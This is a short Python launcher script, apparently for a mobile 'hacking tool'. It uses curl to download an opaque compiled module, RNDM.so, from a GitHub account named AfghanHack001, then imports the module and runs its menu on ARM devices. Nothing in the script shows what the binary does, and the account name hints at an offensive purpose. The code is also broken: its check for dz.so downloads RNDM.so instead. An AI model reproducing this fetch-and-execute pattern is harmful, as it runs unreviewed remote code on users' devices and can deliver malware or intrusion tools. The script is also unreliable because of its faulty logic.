import os
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("RNDM.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AfghanHack001/RNDM/main/RNDM.so -o RNDM.so")
if path.isfile("dz.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AfghanHack001/RNDM/main/RNDM.so -o RNDM.so")

if 'aarch' in arch:
    arch = 'aarch'
    print('\033[1;32m\nCongratulatings! Your Deviec Support This Tools')
    import RNDM
    RNDM.menu()
else:exit('\033[1;31m Sorry System or device not supported ')
    
